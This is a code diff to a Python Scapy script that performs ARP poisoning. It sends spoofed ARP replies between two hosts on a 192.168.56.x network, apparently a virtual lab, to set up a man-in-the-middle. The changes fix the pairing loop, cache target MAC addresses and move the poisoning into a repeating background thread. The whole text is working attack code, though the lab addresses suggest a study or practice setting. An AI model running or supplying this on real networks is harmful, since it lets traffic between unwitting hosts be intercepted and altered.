@@ -10,6 +10,9 @@ host_mac = '08:00:27:d0:25:4b'
 
 ip_to_spoof = '192.168.56.102'
 
+targets = [{'ip': "192.168.56.101"},
+           {'ip': '192.168.56.102'}]
+
 
 def arp_poison_targets(victims, sleep=0):
     """
@@ -22,16 +25,15 @@ def arp_poison_targets(victims, sleep=0):
     assert len(victims) >= 2, 'We must have at least 2 victims to poison'
     while True:
         for i in range(len(victims) - 1):
-            for j in range(j, len(victims)):
+            for j in range(i + 1, len(victims)):
                 print(i, j)
-                # arp poison both ways
+                # # arp poison both ways
                 arp_poisoning(victims[i], victims[j])
                 arp_poisoning(victims[j], victims[i])
-
-        if sleep > 0:
+        if sleep > 1:
             time.sleep(sleep)
         else:
-            return
+            break
 
 
 def arp_poisoning(target, victim):
@@ -41,10 +43,13 @@ def arp_poisoning(target, victim):
     :param victim: ip of the victim to redirect
     :return:
     """
-    tmac = getmacbyip(target)
-    p = Ether(src=host_mac) / ARP(hwsrc=host_mac, psrc=victim, hwdst=tmac, pdst=target)
+    if 'mac' not in target.keys():
+        target['mac'] = getmacbyip(target['ip'])
+    p = Ether(src=host_mac) / ARP(hwsrc=host_mac, psrc=victim['ip'], hwdst=target['mac'], pdst=target['ip'])
     sendp(p, iface='enp0s3')
 
+
+# arp_poisoning(target_ip, ip_to_spoof)
 
 def mitm_attack(victims):
     """
@@ -53,13 +58,12 @@ def mitm_attack(victims):
     :return:
     """
     # start arp poisoning
-    # th = threading.Thread(target=arp_poison_targets, args=(victims,), kwargs={'sleep': 60})
-    # th.start()
-    time.sleep(2)
-    arp_poison_targets(victims, sleep=60)
+    th = threading.Thread(target=arp_poison_targets, args=(victims,), kwargs={'sleep': 60})
+    th.start()
+    # arp_poison_targets(victims, sleep=60)
     print('Started, arp poisoning')
 
     return th
 
 
-th = mitm_attack([target_ip, ip_to_spoof])
+threat = mitm_attack(targets)
